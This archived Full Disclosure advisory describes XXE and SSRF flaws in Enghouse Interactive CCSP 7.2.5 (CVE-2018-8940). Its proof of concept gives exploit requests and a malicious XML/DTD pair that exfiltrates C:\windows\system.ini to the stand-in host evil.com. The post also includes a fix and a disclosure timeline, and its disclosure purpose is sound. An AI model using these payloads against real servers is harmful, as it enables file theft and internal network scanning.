=== Content from seclists.org_61a1eb8f_20250125_212923.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](8)
[By Date](date.html#9)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](8)
[By Thread](index.html#9)
[![Next](/images/right-icon-16x16.png)](10)

![](/shared/images/nst-icons.svg#search)

# Enghouse Interactive´s CCSP 7.2.5 API XXE and SSRF,vulnerability via unauthenticated GET Request

---

*From*: David H <david.herrero.pena () gmail com>

*Date*: Thu, 9 May 2019 11:56:38 +0200

---

```
<!--
# Exploit Title: Enghouse Interactive´s CCSP 7.2.5 API XXE and SSRF
vulnerability via unauthenticated GET Request
# Date: 05-08-2018
# Exploit Author: David Herrero
# Vendor Homepage: <https://www.enghouseinteractive.com>
# Software Link:
<https://www.enghouseinteractive.com/products/contact-center/contact-center-for-service/>
# Version: Enghouse Interactive´s CCSP 7.2.5.102
# Tested on: Windows
# CVE : CVE-2018-8940
# Category: vulnerability

1. Description

The Techpoint API located at
[https://DOMAIN/TouchPoint/api/ClientServiceConfig/GetWcfBase,specifically](https://DOMAIN/TouchPoint/api/ClientServiceConfig/GetWcfBase%2Cspecifically)
the file
"TouchPoint\\Agent\\Enghouse.Gadgetory.Web\\Controllers\\ClientServiceConfigController.cs:line60"
allows an unauthenticated user to control the resource the application
will load. The application will load the resource, and will try to parse
it as an XML document. In this case, DTD are allowed in the file, so an
attacker can forge the malicious XML file with a DTD inside, and use
this XML to read files from the server, SSRF attacks, and check for
valid documents inside the server.

The vulnerable URI is

<http://DOMAIN/TouchPoint/api/ClientServiceConfig/GetWcfBase?&clientInstallationServiceXmlPath=ATTACKERCONTROLLEDPARAMETER>
The value of "ATTACKERCONTROLLEDPARAMETER" is controlled by the
attacker, it can be used for various attacks:

1) Local file check
TouchPoint/api/ClientServiceConfig/GetWcfBase?&clientInstallationServiceXmlPath=C:\Users\USER1

Will check for the existence of user "USER1" inside the server, will
respond with an "authorization error" if the user exists, and with "file
not found" error if the user does not exist.

2) SSRF of internal network
/TouchPoint/api/ClientServiceConfig/GetWcfBase?&clientInstallationServiceXmlPath=<http://localhost:80/a.html>

Will check if the port 80 is open in the server in the internal network,
can be used for scanning ports in adjacent machines. The errors if the
port is open or closed are different.

3) XXE with file exfiltration
The application expects a valid XML file as parameter, if the server
that runs the application has connectivity with internet or with an
attacker's controlled machine, the attacker can host a malicious XML
file and force the application to parse it.

2. Proof of Concept

1)Local file check
/TouchPoint/api/ClientServiceConfig/GetWcfBase?&clientInstallationServiceXmlPath=C:\Users\USER1

2) SSRF in internal network
/TouchPoint/api/ClientServiceConfig/GetWcfBase?&clientInstallationServiceXmlPath=<http://localhost:80/a.html>

3) XXE OOB file exfiltration
/TouchPoint/api/ClientServiceConfig/GetWcfBase?&clientInstallationServiceXmlPath=<http://evil.com/XXE.xml>

In this case "evil.com" is a domain controlled by the attacker.
The content of "XXE.xml" is:

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE demo [
    <!ELEMENT demo ANY >
    <!ENTITY % dtd SYSTEM "[http://evil.com/XXE.dtd"](http://evil.com/XXE.dtd%22);>
    %dtd;
    ]

```
> ```
>
>
>
> ```

```
<demo>&send;</demo>

The content of "[http://evil.com/XXE.dtd"](http://evil.com/XXE.dtd%22); is:
<?xml version="1.0" encoding="UTF-8"?>
    <!ENTITY % file SYSTEM "file:///C:\windows\system.ini">
<!ENTITY % alla "<!ENTITY send SYSTEM
'[http://evil.com/index.html?collect=%file;'](http://evil.com/index.html?collect=%file;&apos);>">
%alla;

With this two files, we are able to red the local file located at
"C:\windows\system.ini" and the content of the file is send to
"<http://evil.com/index.html?collect">; in the URL, so the attacker can
visualize the content of the file in the access logs.

3. Prerequisites
For Local File Check and SSRF there are not requirements. For XXE the
attacked server should have connectivity with the attacker controlled
server. No firewall blocking outcomming connections.

4. Solution:

Update to version 7.2.9

5. Dates
03/21/2018 - Discovered Vulnerability
03/21/2018 - Request for CVE
03/22/2018 - CVE Reserved
03/26/2018 - Details sent to Vendor
04/14/2019 - Vendor confirms that version 7.2.9 correct the vulnerability
05/08/2019 - Public disclosure

```

**Attachment:
[pEpkey.asc](att-9/pEpkey_asc.bin)**

*Description:*

```

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](8)
[By Date](date.html#9)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](8)
[By Thread](index.html#9)
[![Next](/images/right-icon-16x16.png)](10)

### Current thread:

* **Enghouse Interactive´s CCSP 7.2.5 API XXE and SSRF,vulnerability via unauthenticated GET Request** *David H (May 10)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


